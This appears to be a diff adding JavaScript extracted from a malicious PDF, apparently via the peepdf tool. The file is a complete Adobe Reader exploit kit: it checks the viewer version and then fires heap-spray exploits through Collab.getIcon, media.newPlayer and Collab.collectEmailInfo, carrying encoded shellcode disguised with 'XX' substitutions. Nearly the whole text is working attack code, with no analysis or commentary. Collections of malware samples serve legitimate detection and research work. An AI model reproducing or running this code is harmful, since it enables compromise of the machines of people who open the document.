@@ -1,0 +1,118 @@
+// peepdf comment: Javascript code located in object 43 (version 2)
+
+function urpl(sc) {
+    var keyu = "%u";
+    var re = /XX/g;
+    sc = sc.replace(re, keyu);
+    return sc;
+}
+
+function xxsc(sc) {
+    var sprdataxx = "XX4a4bXX4647";
+    var esprpl = unescape;
+    var urpled = esprpl(urpl(sc));
+    var blknum = 0x41000;
+    var sprdata = esprpl(urpl(sprdataxx));
+    while (sprdata.length < blknum)
+    sprdata += sprdata;
+    sprblk = sprdata.substring(0, sprdata.length);
+    scblk = urpled.substring(0, urpled.length);
+    memory = new Array();
+    var k = 0;
+    while (k < 200) {
+        memory[k] = sprblk + scblk;
+        k++;
+    }
+}
+
+function repeat(count, what) {
+    var v = "";
+    while (--count >= 0) v += what;
+    return v;
+}
+
+var s = "XX23ebXX4840XX5f43XX5b57XX8b66XX3c03XX7430XX2c1bXXc063XX04e0XXec80XX8043XX0fe4XXc402XXea34XX0788XX4343XXeb47XXe8e3XXffd8XXffffXX4e69XX4963XX4d71XX4571XX4d71XX4d71XX4d6bXX4563XX4d71XX4d71XX4d71XX4d71XX446eXX4e69XX4463XX4967XX4d72XX4d6dXX4d71XX4463XX4d70XX4f72XX526bXX4364XX4d72XX4963XX506aXX4c71XX4971XX4967XX4571XX4366XX4f6cXX4a67XX446aXX4a6cXX4866XX4464XX506aXX4a64XX4871XX476cXX4566XX4b63XX4c6cXX4864XX4864XX4864XX4864XX4864XX4864XX4864XX4864XX4864XX4864XX4864XX4864XX4864XX4864XX4864XX4864XX4864XX4864XX4864XX4864XX4f67XX4c64XX4e6fXX4d6cXX516bXX4e67XX4d70XX4d71XX4d71XX4d71XX4469XX4d6dXX4971XX4469XX4d6cXX4972XX4a67XX4469XX4d6dXX4571XX4669XX4c69XX4a65XX4d72XX4d6dXX4d71XX4964XX4a69XX4468XX5268XX4d72XX4d6dXX4d71XX4c70XX4665XX4e68XX4f71XX4563XX506fXX4e71XX4d71XX4d71XX4c69XX5065XX5171XX4b63XX4f64XX4964XX4c70XX4d65XX4c70XX4b66XX4f6bXX4368XX476eXX4c65XX4469XX4c68XX4665XX4d72XX4d6dXX4d71XX4f6bXX4469XX4f71XX4f6bXX4470XX4d66XX516cXX5171XX4f6dXX4f6dXX4463XX5164XX4669XX4c68XX4e63XX4d72XX4d6dXX4d71XX4c70XX4f64XX4a68XX4d71XX4d6fXX4d71XX4d71XX4463XX4c72XX436bXX4d71XX4f6eXX4864XX4c6aXX4e65XX4d72XX4d6dXX4d71XX4c69XX4564XX4864XX516cXX5171XX4470XX5265XX506cXX4671XX4f6dXX4e69XX4764XX4d71XX4d72XX4d71XX4d71XX4b6cXX5263XX4669XX4c68XX4666XX4d72XX4d6dXX4d71XX4469XX4563XX5271XX4d71XX4571XX4d71XX4d71XX4d6eXX436bXX4d6dXX4864XX4c6aXX4668XX4d72XX4d6dXX4d71XX4669XX4c69XX4e66XX4d72XX4d6dXX4d71XX4c71XX5265XX4669XX4c69XX5266XX4d72XX4d6dXX4d71XX436bXX4d71XX436bXX4d71XX436bXX4d71XX4864XX4c68XX4666XX4d72XX4d6dXX4d71XX4864XX4c6aXX4a68XX4d72XX4d6dXX4d71XX4469XX4c68XX4e66XX4d72XX4d6dXX4d71XX4a69XX4468XX4a66XX4d72XX4d6dXX4d71XX4469XX4c6aXX4666XX4d72XX4d6dXX4d71XX4a69XX4c69XX5068XX4e72XX4d6dXX4d71XX4d6eXX4f6eXX436bXX4d71XX506eXX526eXX4f6eXX4b6eXX4864XX4c68XX4e63XX4d72XX4d6dXX4d71XX4864XX4c67XX5268XX4d72XX4d6dXX4d71XX4471XX4d65XX526cXX4b71XX4463XX4d6bXX4469XX4c68XX4e66XX4d72XX4d6dXX4d71XX4469XX4f71XX4a70XX526fXX4d6eXX516dXX4f6dXX516cXX4971XX4469XX4c68XX4666XX4d72XX4d6dXX4d71XX4f6dXX4663XX446eXX4864XX4864XX4864XX4469XX4c68XX4e66XX4d72XX4d6dXX4d71XX4c70XX4665XX4368XX4364XX4464XX4964XX4a64XX4463XX4571XX4469XX4f71XX4470XX4b65XX516cXX4f71XX4f6dXX4e6dXX4470XX4a65XX4b6cXX5164XX4c69XX4f65XX5171XX4469XX4468XX5266XX4d72XX4d6dXX4d71XX4668XX4d71XX5071XX4d71XX4d71XX5167XX4b63XX4a64XX4469XX4468XX4e66XX4d72XX4d6dXX4d71XX4864XX4c68XX4666XX4d72XX4d6dXX4d71XX4864XX4c6aXX5265XX4d72XX4d6dXX4d71XX4864XX4c68XX5266XX4d72XX4d6dXX4d71XX4c65XX4864XX4c68XX4666XX4d72XX4d6dXX4d71XX4864XX4c6aXX5265XX4d72XX4d6dXX4d71XX436bXX4d71XX4864XX4c6aXX4665XX4d72XX4d6dXX4d71XX4c65XX4d6bXX4469XX4c68XX4a65XX4d72XX4d6dXX4d71XX4c71XX4f6cXX4970XX4469XX4f6cXX456cXX4c71XX4c68XX4a65XX4d72XX4d6dXX4d71XX4f6eXX4469XX476dXX4572XX4469XX4f6cXX4d6fXX4c71XX4c68XX4a65XX4d72XX4d6dXX4d71XX4c70XX4d65XX4c70XX4b66XX4f6eXX4469XX4f70XX4c71XX4c68XX4a65XX4d72XX4d6dXX4d71XX4967XX4570XX4d63XX516cXX5071XX4e65XX4365XX4a71XX4c71XX4d66XX4463XX5164XX4470XX5072XX516cXX4671XX476eXX4c69XX4f65XX5171XX466dXX516cXX5270XX4463XX4966XX476eXX4469XX4f66XX476eXX446fXX4f6eXX4d6fXX446fXX4c6aXX4a65XX4d72XX4d6dXX4d71XX4e66XX4363XX4c71XX4f6eXX516fXX4c71XX4c6aXX4a65XX4d72XX4d6dXX4d71XX4871XX5068XX4b71XX4e65XX4d63XX4b71XX4c71XX4f6dXX4972XX4c71XX4c69XX4a65XX4d72XX4d6dXX4d71XX4469XX4d71XX4c71XX4c69XX4a65XX4d72XX4d6dXX4d71XX4669XX5071XX4463XX4e71XX476eXX4e6bXX4c65XX3030"
+
+
+function exp8() {
+    var spd = "XX000aXX000aXX000aXX000a";
+    var esc = unescape;
+    var spr = esc(urpl(spd));
+
+    var of = repeat(4096, spr);
+    var a = ["_N.bundle"]; //javascript comment
+    Collab["getIcon"](of + a[0x0]);
+}
+
+function exp9() {
+    var esprpl = unescape;
+    var sc = esprpl(urpl(s));
+
+    var ret = unescape("%u0c0c%u0c0c");
+    var sc2 = unescape("%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u6b62%u546e%u596a%u6c76%u506a%u5470%u666f%u7441%u4356%u586c%u726d%u4153%u4b4a%u624c%u7948%u4659%u6156%u7761%u7051%u7842%u5342%u4a64%u6365%u7464%u4972%u5766%u534d%u7569");
+
+    while (ret.length <= 0x8000) ret += ret;
+    ret = ret.substring(0, 0x8000 - s.length);
+    memory = new Array();
+
+    for (i = 0; i < 0x2000; i++) {
+        memory[i] = ret + sc;
+    }
+
+    util.printd("jbBFAXmYeqFJUPOXePHkjhAybWoldsgWfmBw", new Date());
+    util.printd("noCXCPHRXLpZKyNpKJJWxBkvpjKLYwpMfmCG", new Date());
+    try {
+        this.media.newPlayer(null);
+    } catch (e) {}
+    util.printd(sc2, new Date());
+
+}
+
+function start() {
+    var esprpl = unescape;
+    var sc = esprpl(urpl(s));
+
+    if (app.viewerVersion >= 7.0) {
+        plin = repeat(1124, unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%u0b0b%u0028%u0aeb%u0aeb") + unescape("%u4346%u4a4b") + repeat(122, unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%u4a4b%u4748%u4a4b%u4748%u4a4b%u4748") + sc + repeat(1256, unescape("%u4a4b%u4748"));
+    } else {
+        ef6 = unescape("%uf6eb%uf6eb") + unescape("%u0b0b%u0019");
+        plin = repeat(80, unescape("%u4141%u4141")) + sc + repeat(80, unescape("%u4241%u4142")) + unescape("%uf7e9%ufff9") + unescape("%uffff%uffff") + unescape("%uf6eb%uf4eb") + unescape("%uf2eb%uf1eb");
+        while ((plin.length % 8) != 0)
+        plin = unescape("%u4141") + plin;
+
+        plin += repeat(2626, ef6);
+    }
+    if (app.viewerVersion >= 6.0) {
+        var a = []; //javascript for adobe
+        Collab["collectEmailInfo"]({
+            subj: a[0x0],
+            msg: plin
+        });
+    }
+}
+
+
+var ver = app.viewerVersion
+
+if ((ver >= 9.1) || ((ver > 8.102) && (ver < 9.0))) {
+    var inBrowser = this.external;
+    if (inBrowser) var shaft = app.setTimeOut("exp9()", 1200);
+    else exp9();
+} else {
+    if (ver >= 8.0) {
+        xxsc(s);
+
+        var inBrowser = this.external;
+        if (inBrowser) var shaft = app.setTimeOut("exp8()", 1200);
+        else exp8();
+    } else {
+        if (ver >= 6.0) {
+            var inBrowser = this.external;
+            if (inBrowser) var shaft = app.setTimeOut("start()", 1200);
+            else start();
+        } else {
+            while (1) {};
+        }
+    }
+}
+
